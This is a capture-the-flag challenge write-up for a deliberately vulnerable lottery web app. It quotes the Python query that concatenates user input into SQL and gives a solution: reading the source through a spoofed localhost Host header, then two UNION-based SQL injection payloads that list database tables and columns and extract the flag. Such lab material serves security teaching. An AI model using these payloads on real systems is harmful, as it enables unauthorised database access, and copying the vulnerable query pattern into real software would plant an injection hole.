# Cheated Lottery 2

I am an admin of this lottery and I found my mistakes in the code - I fixed them before my boss could see them. Unfortunately no one can win now - small price for not being fired. Need to fix this ASAP...

## Challenge

Flag is stored in `bm9wZS1ub3QtaGVyZS4uLm9yIGlzIGl0Pwo` database - you need to read it using SQLi

To run this you have to change flag in `entrypoint.sh` and build a docker image. Server will be exposed on port 7331

## Solution

You can see python code by accessing `/?source=1` with Host header set to localhost

Vulnerable piece of code:
```python
mycursor.execute("SELECT * FROM coupons WHERE code = /*" + str(form['cid']) + "*/ '1234'")
```

As seen [here](https://wiki.owasp.org/index.php/Testing_for_MySQL#Fingerprinting_MySQL) we can use syntax specific for MySQL

1. SQL: 
```sql
!'' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND '1234'=0 --
```

2. SQL: 
```sql
!'' UNION SELECT 1,Y29sdW1ueGRuYW1l,2 FROM ZnVubnkgdGFibGUgbmFtZQ WHERE '1234'=0 --
```
